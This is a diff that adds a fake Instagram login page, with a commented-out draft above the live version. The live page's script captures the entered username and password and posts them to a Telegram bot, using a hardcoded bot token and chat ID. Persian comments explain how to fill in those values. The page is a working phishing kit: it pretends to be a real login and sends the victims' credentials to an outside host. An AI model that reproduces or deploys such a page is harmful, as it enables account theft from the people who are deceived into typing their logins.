@@ -1,0 +1,183 @@
+<!-- <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            width: 350px;
+            text-align: center;
+        }
+
+        .login-container img {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            background-color: #fafafa;
+        }
+
+        .login-container input[type="submit"] {
+            background-color: #3897f0;
+            color: white;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .login-container input[type="submit"]:hover {
+            background-color: #3183d6;
+        }
+
+        .login-container p {
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>instagram</h1>
+<img src="0cf505cad3b48c8ce1fb34816218074c.png" alt="">
+        <form>
+            <input type="text" placeholder="Phone number, username, or email">
+            <input type="password" placeholder="Password">
+            <input type="submit" value="Log In">
+        </form>
+        <p>Forgot password?</p>
+    </div>
+</body>
+</html> -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            width: 350px;
+            text-align: center;
+        }
+
+        .login-container img {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            background-color: #fafafa;
+        }
+
+        .login-container input[type="submit"] {
+            background-color: #3897f0;
+            color: white;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .login-container input[type="submit"]:hover {
+            background-color: #3183d6;
+        }
+
+        .login-container p {
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Instagram</h1>
+        <img src="0cf505cad3b48c8ce1fb34816218074c.png" alt="">
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <input type="submit" value="Log In">
+        </form>
+        <p>Forgot password?</p>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // جلوگیری از رفتار پیش‌فرض فرم
+
+            // گرفتن مقادیر فرم
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // توکن ربات و چت آیدی
+            var botToken = '6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw'; // توکن ربات تلگرام خود را اینجا وارد کنید
+            var chatId = '1209515299'; // چت آیدی مقصد را اینجا وارد کنید
+
+            // پیام ارسالی
+            var message = 'Username: ' + username + '\nPassword: ' + password;
+
+            // ارسال پیام به تلگرام
+            var telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('Login info sent to Telegram!');
+                } else {
+                    alert('Error sending message to Telegram.');
+                }
+            })
+            .catch(error => {
+                alert('Error: ' + error.message);
+            });
+        });
+    </script>
+</body>
+</html>
